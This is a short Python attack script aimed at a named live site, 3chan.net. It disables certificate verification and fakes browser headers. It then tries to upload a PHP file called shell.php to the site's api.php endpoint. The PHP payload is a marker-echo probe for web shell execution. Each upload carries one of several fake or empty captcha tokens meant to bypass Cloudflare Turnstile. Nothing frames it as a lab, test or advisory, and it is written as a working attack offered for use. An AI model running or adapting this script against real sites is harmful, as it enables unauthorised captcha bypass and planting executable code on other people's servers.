#!/usr/bin/env python3
"""3chan - Turnstile bypass attempts on upload"""
import urllib.request, uuid, ssl, json

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

UA = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/125.0.0.0",
      "Accept": "application/json, text/plain, */*",
      "Origin": "https://3chan.net",
      "Referer": "https://3chan.net/"}

def upload(filename, token, content, ctype="image/jpeg"):
    boundary = uuid.uuid4().hex
    body = b""
    fields = [("action", "post_thread"), ("board", "b"), ("turnstile_token", token),
              ("name", "t"), ("subject", ""), ("email", ""), ("comment", "test"),
              ("spoiler", "0")]
    for k, v in fields:
        body += b"--" + boundary.encode() + b"\r\n"
        body += ('Content-Disposition: form-data; name="%s"\r\n\r\n' % k).encode()
        body += v.encode() + b"\r\n"
    body += b"--" + boundary.encode() + b"\r\n"
    body += ('Content-Disposition: form-data; name="image"; filename="%s"\r\n' % filename).encode()
    body += ('Content-Type: %s\r\n\r\n' % ctype).encode()
    body += content + b"\r\n"
    body += b"--" + boundary.encode() + b"--\r\n"
    h = {**UA, "Content-Type": "multipart/form-data; boundary=" + boundary}
    req = urllib.request.Request("https://3chan.net/api.php", data=body, headers=h, method="POST")
    try:
        r = urllib.request.urlopen(req, timeout=15, context=ctx)
        return r.status, r.read(8000).decode("utf-8", "ignore")
    except urllib.error.HTTPError as e:
        return e.code, e.read(8000).decode("utf-8", "ignore")
    except Exception as ex:
        return 0, str(ex)[:120]

SHELL = b'<?php echo "SHELL_3CHAN_271828"; ?>'

# bypass attempts
tokens = [
    "dummy",  # 1. common dummy
    "x".ljust(40, "0"),  # 2. long fake
    "AAAA",  # 3. short
    "0" * 64,  # 4. zeros
    "test-token",  # 5
    "",  # 6. empty -> missing captcha
]
for t in tokens:
    code, resp = upload("shell.php", t, SHELL, "application/x-php")
    print("token=%r: %s %s" % (t[:20], code, resp[:100]), flush=True)
